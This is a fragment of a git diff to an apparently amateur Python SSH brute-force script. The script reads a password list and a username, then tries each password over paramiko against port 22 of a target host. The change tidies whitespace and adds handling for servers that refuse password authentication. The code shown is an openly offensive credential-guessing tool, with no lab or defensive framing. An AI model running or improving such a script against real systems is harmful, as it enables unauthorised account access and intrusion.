@@ -5,7 +5,7 @@ import sys
 import termcolor
 import pyfiglet
 
-Banner = pyfiglet.figlet_format("Brute Forcer") 
+Banner = pyfiglet.figlet_format("Brute Forcer")
 print(Banner)
 password = input("[+] Enter the passwords file: ")
 user = input("[+] Enter the username: ")
@@ -18,6 +18,9 @@ def ssh_connect(p, code=0):
 
     try:
         ssh.connect(host, port=22, username=user, password=p)  # Call password p because we used it above
+    except paramiko.BadAuthenticationType: # If the website doesn't take something, lets say it only accepts
+        # public key, this will catch that.
+        code = 0
     except paramiko.AuthenticationException:
         code = 1
     except socket.error as e:
